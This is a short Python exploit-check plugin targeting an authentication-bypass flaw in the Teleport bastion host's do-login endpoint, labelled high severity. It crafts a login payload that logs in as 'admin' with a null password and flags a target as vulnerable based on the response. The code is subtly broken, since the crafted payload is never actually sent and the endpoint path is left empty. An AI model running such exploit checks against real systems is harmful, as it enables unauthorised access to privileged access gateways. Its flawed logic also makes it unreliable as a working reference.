#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re

def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Teleport堡垒机 do-login 任意用户登录漏洞',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  data = 'args={"type":2,"username":"admin","password":null,"captcha":"ykex","oath":"","remember":false}'
  target = ''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r"code.*?0.*?message.*?data",res.text):
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret